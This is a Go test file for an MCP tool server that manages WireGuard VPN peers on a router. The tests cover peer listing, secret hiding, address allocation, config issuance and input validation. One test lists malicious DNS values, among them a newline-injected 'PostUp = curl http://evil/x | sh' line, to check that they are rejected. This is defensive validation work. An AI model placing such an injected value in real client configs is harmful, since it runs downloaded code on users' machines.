package mcp_test

import (
	"encoding/json"
	"strings"
	"testing"
)

// TestTools_ListServerPeers — до этого list_managed_servers отдавал лишь
// счётчик пиров: кто именно подключён к домашнему серверу, агенту было не
// видно.
func TestTools_ListServerPeers(t *testing.T) {
	s, _ := newTestSession(t)

	res, out := callTool(t, s, "list_server_peers", map[string]any{"serverId": "Wireguard0"})
	if res.IsError {
		t.Fatal(toolText(res))
	}
	peers := out["peers"].([]any)
	if len(peers) != 2 {
		t.Fatalf("peers = %v", peers)
	}
	first := peers[0].(map[string]any)
	if first["description"] != "laptop" || first["tunnelIp"] != "10.0.0.2/32" {
		t.Fatalf("peer = %v", first)
	}
	if first["enabled"] != true {
		t.Fatalf("enabled = %v", first["enabled"])
	}
	if first["publicKey"] == "" {
		t.Fatal("the public key identifies the peer for every other tool")
	}

	if res, _ := callTool(t, s, "list_server_peers", map[string]any{"serverId": "nope"}); !res.IsError {
		t.Error("an unknown server must be a tool error")
	}
}

// TestTools_ListServerPeersHidesSecrets — приватный ключ и PSK пира лежат
// в хранилище ради генерации .conf. В списке им делать нечего: конфиг
// выдаётся отдельным инструментом, с предупреждением.
func TestTools_ListServerPeersHidesSecrets(t *testing.T) {
	s, _ := newTestSession(t)

	_, out := callTool(t, s, "list_server_peers", map[string]any{"serverId": "Wireguard0"})
	blob := strings.ToLower(toolJSON(t, out))
	for _, secret := range []string{"privatekey", "presharedkey", "secret-private", "secret-psk"} {
		if strings.Contains(blob, secret) {
			t.Fatalf("the peer listing must not carry %q: %s", secret, blob)
		}
	}
}

// TestTools_AddServerPeerAllocatesAnAddress — адрес в туннеле обязан быть
// свободным и из подсети сервера. Заставить модель придумать его — это
// либо коллизия, либо пир в чужой подсети, который просто не работает.
func TestTools_AddServerPeerAllocatesAnAddress(t *testing.T) {
	s, _ := newTestSession(t)

	res, out := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": "phone"})
	if res.IsError {
		t.Fatal(toolText(res))
	}
	if out["tunnelIp"] != "10.0.0.4/32" {
		t.Fatalf("tunnelIp = %v, want the first free address after .2 and .3", out["tunnelIp"])
	}
	if out["description"] != "phone" || out["publicKey"] == "" {
		t.Fatalf("peer = %v", out)
	}
	// The peer is created enabled and immediately usable.
	if out["enabled"] != true {
		t.Fatalf("enabled = %v", out["enabled"])
	}

	_, out = callTool(t, s, "list_server_peers", map[string]any{"serverId": "Wireguard0"})
	if n := len(out["peers"].([]any)); n != 3 {
		t.Fatalf("peers after add = %d", n)
	}
}

func TestTools_AddServerPeerRejectsBadInput(t *testing.T) {
	s, _ := newTestSession(t)

	if res, _ := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0"}); !res.IsError {
		t.Error("a peer with no description is unidentifiable later; it must be refused")
	}
	if res, _ := callTool(t, s, "add_server_peer", map[string]any{"description": "x"}); !res.IsError {
		t.Error("missing serverId must be a tool error")
	}
	if res, _ := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": "x", "tunnelIp": "not-an-ip"}); !res.IsError {
		t.Error("a malformed tunnelIp must be a tool error")
	}
	// An address already taken must fail rather than silently collide.
	if res, _ := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": "x", "tunnelIp": "10.0.0.2/32"}); !res.IsError {
		t.Error("a used address must be a tool error")
	}
}

// TestTools_SetServerPeerEnabled — отключить клиента, не удаляя его:
// удаление пира через MCP не предусмотрено, а «выключи ноутбук на время»
// — обычная просьба.
func TestTools_SetServerPeerEnabled(t *testing.T) {
	s, _ := newTestSession(t)

	res, out := callTool(t, s, "set_server_peer_enabled", map[string]any{"serverId": "Wireguard0", "publicKey": "pub-laptop=", "enabled": false})
	if res.IsError {
		t.Fatal(toolText(res))
	}
	if out["enabled"] != false || out["publicKey"] != "pub-laptop=" {
		t.Fatalf("out = %v", out)
	}

	_, out = callTool(t, s, "list_server_peers", map[string]any{"serverId": "Wireguard0"})
	peers := out["peers"].([]any)
	if len(peers) != 2 {
		t.Fatalf("a disabled peer must stay in the list: %v", peers)
	}
	if peers[0].(map[string]any)["enabled"] != false {
		t.Fatalf("peer = %v", peers[0])
	}

	if res, _ := callTool(t, s, "set_server_peer_enabled", map[string]any{"serverId": "Wireguard0", "publicKey": "nope", "enabled": true}); !res.IsError {
		t.Error("an unknown peer must be a tool error")
	}
}

// TestTools_GetServerPeerConfig — ради этого всё и затевается: «добавь
// телефон и дай конфиг». Конфиг содержит приватный ключ, поэтому
// выдаётся только явным вызовом.
func TestTools_GetServerPeerConfig(t *testing.T) {
	s, _ := newTestSession(t)

	res, out := callTool(t, s, "get_server_peer_config", map[string]any{"serverId": "Wireguard0", "publicKey": "pub-laptop="})
	if res.IsError {
		t.Fatal(toolText(res))
	}
	conf, _ := out["config"].(string)
	if !strings.Contains(conf, "[Interface]") || !strings.Contains(conf, "[Peer]") {
		t.Fatalf("config = %q", conf)
	}
	if res, _ := callTool(t, s, "get_server_peer_config", map[string]any{"serverId": "Wireguard0", "publicKey": "nope"}); !res.IsError {
		t.Error("an unknown peer must be a tool error")
	}
}

// TestTools_PeerToolsCarryTheRightAnnotations — выдача пира создаёт
// работающие учётные данные VPN, но обратима (пира можно выключить), а
// конфиг только читается.
func TestTools_PeerToolsCarryTheRightAnnotations(t *testing.T) {
	s, _ := newTestSession(t)
	tools, err := s.ListTools(t.Context(), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]bool{ // tool -> read-only
		"list_server_peers":       true,
		"get_server_peer_config":  true,
		"add_server_peer":         false,
		"set_server_peer_enabled": false,
	}
	seen := 0
	for _, tool := range tools.Tools {
		ro, ok := want[tool.Name]
		if !ok {
			continue
		}
		seen++
		if tool.Annotations == nil {
			t.Errorf("%s has no annotations", tool.Name)
			continue
		}
		if tool.Annotations.ReadOnlyHint != ro {
			t.Errorf("%s: readOnlyHint = %v, want %v", tool.Name, tool.Annotations.ReadOnlyHint, ro)
		}
		if d := tool.Annotations.DestructiveHint; d == nil || *d {
			t.Errorf("%s must not be annotated destructive: %v", tool.Name, d)
		}
	}
	if seen != len(want) {
		t.Fatalf("saw %d of the %d peer tools", seen, len(want))
	}
}

// toolJSON re-encodes a decoded tool result so a test can assert on the
// whole payload — field names included, which is where a leaked secret
// would show up.
func toolJSON(t *testing.T, out map[string]any) string {
	t.Helper()
	b, err := json.Marshal(out)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// TestTools_ManagedServersSayWhichAcceptPeerTools — list_managed_servers
// показывает и встроенные WG-серверы NDMS, и серверы, заведённые
// awg-manager. Пиры через MCP ведутся только у вторых, и агент обязан
// видеть, к какому серверу инструменты пиров применимы: раньше оба
// пространства id были разными, и ни один инструмент пиров нельзя было
// довести до конца.
func TestTools_ManagedServersSayWhichAcceptPeerTools(t *testing.T) {
	s, _ := newTestSession(t)

	_, out := callTool(t, s, "list_managed_servers", nil)
	servers := out["servers"].([]any)
	if len(servers) != 2 {
		t.Fatalf("servers = %v, want the managed one and the built-in one", servers)
	}
	byID := map[string]map[string]any{}
	for _, sv := range servers {
		m := sv.(map[string]any)
		byID[m["id"].(string)] = m
	}
	if byID["Wireguard0"]["managed"] != true {
		t.Fatalf("the awg-manager server must be flagged managed: %v", byID["Wireguard0"])
	}
	if byID["Wireguard1"]["managed"] != false {
		t.Fatalf("the built-in server must not be flagged managed: %v", byID["Wireguard1"])
	}

	// A built-in server is listed, but the peer tools cannot serve it and
	// must say why rather than "not found".
	res, _ := callTool(t, s, "list_server_peers", map[string]any{"serverId": "Wireguard1"})
	if !res.IsError {
		t.Fatal("peer tools on a non-managed server must be refused")
	}
	if txt := toolText(res); !strings.Contains(strings.ToLower(txt), "managed") {
		t.Fatalf("the refusal must explain the server is not managed by awg-manager: %q", txt)
	}
}

// TestTools_AddServerPeerRejectsDNSThatIsNotAnAddress — ревью нашло: dns
// не проверялся нигде и попадал в .conf клиента как есть. Значение вида
// «1.1.1.1\nPostUp = …» превращалось в конфиг, который выполняет команду
// на машине пользователя при импорте в wg-quick. Поле — список адресов
// и ничего больше.
func TestTools_AddServerPeerRejectsDNSThatIsNotAnAddress(t *testing.T) {
	s, _ := newTestSession(t)
	bad := []string{
		"1.1.1.1\nPostUp = curl http://evil/x | sh",
		"1.1.1.1\r\n[Peer]",
		"dns.example.com",
		"1.1.1.1, not-an-ip",
		"1.1.1.1;8.8.8.8",
	}
	for _, dns := range bad {
		res, _ := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": "x", "dns": dns})
		if !res.IsError {
			t.Errorf("dns %q was accepted", dns)
		}
	}
	res, out := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": "ok", "dns": " 1.1.1.1 , 2606:4700::1111 "})
	if res.IsError {
		t.Fatalf("a plain address list must be accepted: %s", toolText(res))
	}
	if out["dns"] != "1.1.1.1, 2606:4700::1111" {
		t.Fatalf("dns must be forwarded canonicalised, got %v", out["dns"])
	}
}

// TestTools_AddServerPeerCapsTheDescription — описание уходит в NDMS, в
// settings.json и в журнал. Многомегабайтная строка от валидного ключа
// раздувает всё три места на роутере с десятками мегабайт памяти.
func TestTools_AddServerPeerCapsTheDescription(t *testing.T) {
	s, _ := newTestSession(t)
	if res, _ := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": strings.Repeat("x", 65)}); !res.IsError {
		t.Error("a 65-rune description must be refused")
	}
	if res, _ := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": "tab\there"}); !res.IsError {
		t.Error("control characters in the description must be refused")
	}
	if res, _ := callTool(t, s, "add_server_peer", map[string]any{"serverId": "Wireguard0", "description": strings.Repeat("ё", 64)}); res.IsError {
		t.Errorf("64 runes must be accepted: %s", toolText(res))
	}
}
